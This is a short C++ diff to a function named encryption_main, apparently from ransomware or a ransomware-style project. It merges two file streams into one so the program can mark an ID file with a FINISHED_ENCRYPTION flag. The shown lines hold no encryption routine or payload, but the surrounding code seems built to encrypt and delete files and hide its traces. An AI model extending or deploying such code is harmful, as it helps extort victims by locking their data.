@@ -38,8 +38,7 @@ int encryption_main( bool fromStart) {
 	string pathToID = get_path_to_id();
 
 	//TODO set SquanchedID and IMAGE invisible
-	std::ofstream IDFile;
-	std::ifstream readIDFile;
+	std::fstream IDFile;
 	PBYTE id = nullptr;
 	HANDLE hCurrentProcess = nullptr;
 	HANDLE hJob = nullptr;
@@ -108,21 +107,14 @@ int encryption_main( bool fromStart) {
 	{
 		remove(path);
 	}
-	readIDFile.open(pathToID, std::ios::in);
-	if (!readIDFile.is_open())
-	{
-		std::cout << "Failed to open file: " << GetLastError() << std::endl;
-	}
-	fileRead = string((std::istreambuf_iterator<char>(readIDFile)), std::istreambuf_iterator<char>());
-
-	fileRead[0] = FINISHED_ENCRYPTION;
-	readIDFile.close();
-
-	IDFile.open(pathToID,  std::ios::out);
+	IDFile.open(pathToID, std::ios::in | std::ios::out);
 	if (!IDFile.is_open())
 	{
 		std::cout << "Failed to open file: " << GetLastError() << std::endl;
 	}
+	fileRead = string((std::istreambuf_iterator<char>(IDFile)), std::istreambuf_iterator<char>());
+	IDFile.seekp(0);
+	fileRead[0] = FINISHED_ENCRYPTION;
 	IDFile << fileRead;
 	IDFile.close();
 
